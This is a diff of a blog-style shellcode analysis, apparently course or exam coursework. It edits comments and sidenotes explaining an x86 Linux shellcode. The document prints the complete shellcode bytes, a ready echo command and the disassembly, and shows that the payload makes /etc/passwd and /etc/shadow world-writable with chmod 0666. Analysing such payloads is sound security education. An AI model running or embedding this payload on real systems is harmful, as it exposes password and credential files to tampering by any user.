@@ -80,7 +80,7 @@ In the case of shellcodes and malwares, the objective is to hide their presence 
 
 ## Analysis
 
-First, here's the original shellcode in **Intel syntax**, since the shellcode on the oroginal page uses **AT&T syntax**.
+First, here's the original shellcode in **Intel syntax**, since the shellcode on the original page uses **AT&T syntax**.
 
 ```bash
 echo -n "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80" > shellcode.bin
@@ -106,11 +106,12 @@ ndisasm -b 32 -p intel shellcode.bin
 00000016  89E3              mov ebx,esp
 
                             ; chmod(EBX, ECX)
+                            ; ECX = permissions u=rw, g=rw, o=rw
 00000018  B00F              mov al,0xf
 0000001A  CD80              int 0x80
 ```
 
-{% sidenote `chmod("/etc//passwd", 0666)` %}
+{% sidenote First it runs the instruction `chmod("/etc//passwd", 0666)` to change the permissions over `/etc/passwd` %}
 
 ```nasm
                             ; EAX = 0
@@ -125,20 +126,22 @@ ndisasm -b 32 -p intel shellcode.bin
                             ; EBX = pointer to "/etc//shadow"
 0000002E  89E3              mov ebx,esp
 
-                            ; chmod(EBX, ECX)
+                            ; call chmod(EBX, ECX)
+                            ; ECX = permissions u=rw, g=rw, o=rw
 00000030  B00F              mov al,0xf
 00000032  CD80              int 0x80
 ```
 
-{% sidenote `chmod("/etc//shadow", 0666)` %}
+{% sidenote After that it runs the instruction `chmod("/etc//shadow", 0666)` to change the permissions over `/etc/shadow` %}
 
 ```nasm
+                            ; call exit syscall
 00000034  31C0              xor eax,eax
 00000036  40                inc eax
 00000037  CD80              int 0x80
 ```
 
-{% sidenote `exit(EBX)` %}
+{% sidenote Finally it exits using `exit(EBX)` %}
 
 It translates into the following C program:
 
@@ -155,6 +158,8 @@ int main(int argc, char *argv[])
   exit(EBX);
 }
 ```
+
+It changes the permissions on the files `/etc/passwd` and `/etc/shadow` to `0666`. After that, it uses the `exit` syscall to terminate its own execution.
 
 ### Polymorphic version
 
